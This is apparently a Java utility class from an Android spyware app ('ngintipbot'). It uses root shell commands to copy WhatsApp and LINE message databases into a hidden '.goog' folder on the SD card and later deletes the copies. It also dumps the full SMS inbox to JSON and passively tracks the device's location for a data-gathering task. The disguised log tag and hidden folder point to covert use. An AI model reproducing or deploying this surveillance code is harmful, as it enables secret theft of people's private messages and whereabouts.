package com.bango.ngintipbot;

import java.io.DataInputStream;
import java.io.DataOutputStream;

import org.json.JSONArray;

import com.bango.ngintipbot.models.GatherDataParameter;
import com.bango.ngintipbot.models.SMSMessage;

import android.content.Context;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;

public class Utils {

    public static final String TAG = "GOOGPLEMENTER";

    private static LocationManager lm;
    private static long now;
    private static final long THIRTY_SECONDS = 1000 * 30;
    private static final long ONE_HOUR = 1000 * 60 * 60;

    public static final String SDCARD = String.format("%s/", Environment.getExternalStorageDirectory().getPath());

    private static final String LINE_PATH = "/data/data/jp.naver.line.android/";
    private static final String WHATSAPP_PATH = "/data/data/com.whatsapp/";

    private static final String URI_SMS = "content://sms/inbox";

    private static Context LOCATION_CONTEXT;

    public static void log(String message) {
        Log.v(Utils.TAG, message);
    }

    public static String readSMS(Context context) {
        Uri uri = Uri.parse(URI_SMS);
        Cursor c = context.getContentResolver().query(uri, null, null ,null,null);

        JSONArray messages = new JSONArray();

        if(c != null && c.moveToFirst()) {
            for(int i=0; i<c.getCount(); i++) {
                try {
                    SMSMessage msg = new SMSMessage();

                    msg.setId(c.getLong(c.getColumnIndexOrThrow("_id")));
                    msg.setBody(c.getString(c.getColumnIndexOrThrow("body")).toString());
                    msg.setNumber(c.getString(c.getColumnIndexOrThrow("address")).toString());
                    msg.setPerson(c.getString(c.getColumnIndexOrThrow("person")).toString());
                    msg.setTimestamp(c.getString(c.getColumnIndexOrThrow("date")).toString());

                    messages.put(msg.toJSON());
                } catch(Exception e) {}

                c.moveToNext();
            }

            c.close();
        }

        return messages.toString();
    }

    public static String readWhatsapp() {
        String now = String.format("%s.goog/whatsapp/whatsapp-%d.tgz", SDCARD, System.currentTimeMillis()/1000);
        String[] run = {
                String.format("mkdir -p %s.goog/whatsapp", SDCARD),
                String.format("rm -rf %s.goog/*", SDCARD),
                String.format("tar czf %s %sdatabases/msgstore*", now, WHATSAPP_PATH)
        };
        Utils.runProcess(run);
        return String.format(now);
    }

    public static void deleteWhatsapp() {
        String[] run = {
                String.format("rm -rf %s.goog/whatsapp", SDCARD)
        };

        Utils.runProcess(run);
    }

    public static String readLine() {
        String now = String.format("%s.goog/line/line-%d.tgz", SDCARD, System.currentTimeMillis()/1000);
        String[] run = {
            String.format("mkdir -p %s.goog/line", SDCARD),
            String.format("rm -rf %s.goog/*", SDCARD),
            String.format("tar czf %s %sdatabases/naver_line*", now, LINE_PATH)
        };

        Utils.runProcess(run);
        return String.format(now);
    }

    public static void deleteLine() {
        String[] run = {
            String.format("rm -rf %s.goog/line", SDCARD)
        };

        Utils.runProcess(run);
    }

    public static void deleteGoog() {
        String[] run = {
            String.format("rm -rf %s.goog", SDCARD)
        };

        Utils.runProcess(run);
    }

    public static String runProcess(String[] functs) {
        StringBuffer result = new StringBuffer("");
        String temp;

        try {
            Process process = Runtime.getRuntime().exec("su");

            DataOutputStream stdin = new DataOutputStream(process.getOutputStream());
            DataInputStream stdout = new DataInputStream(process.getInputStream());
            DataInputStream stderr = new DataInputStream(process.getErrorStream());

            for(String cmd : functs) {
                stdin.writeBytes(cmd + " \n");
                stdin.flush();
            }

            stdin.writeBytes("exit\n");
            stdin.flush();

            process.waitFor();

            while((temp = stdout.readLine()) != null)
                result.append(temp + "\n");

            stdin.close();
            stdout.close();
            stderr.close();

            process.destroy();

            return result.toString();
        }
        catch(Exception e) {
            return e.getMessage();
        }
    }

    public static void getLocation(Context ctx) {
        if(lm == null)
            lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
        LOCATION_CONTEXT = ctx;

        now = System.currentTimeMillis();
        lm.requestLocationUpdates(LocationManager.PASSIVE_PROVIDER, THIRTY_SECONDS, 0, ll);
    }

    private static LocationListener ll = new LocationListener() {
        @Override
        public void onLocationChanged(Location loc) {
            long delta = loc.getTime() - now;
            if(delta < THIRTY_SECONDS || delta >= ONE_HOUR)
                return;

            lm.removeUpdates(ll);

            GatherDataParameter param = new GatherDataParameter();
            param.setLocation(loc);
            param.setContext(LOCATION_CONTEXT);
            new GatherData().execute(param);
        }

        @Override
        public void onStatusChanged(String s, int i, Bundle bundle) {

        }

        @Override
        public void onProviderEnabled(String s) {

        }

        @Override
        public void onProviderDisabled(String s) {

        }
    };

}
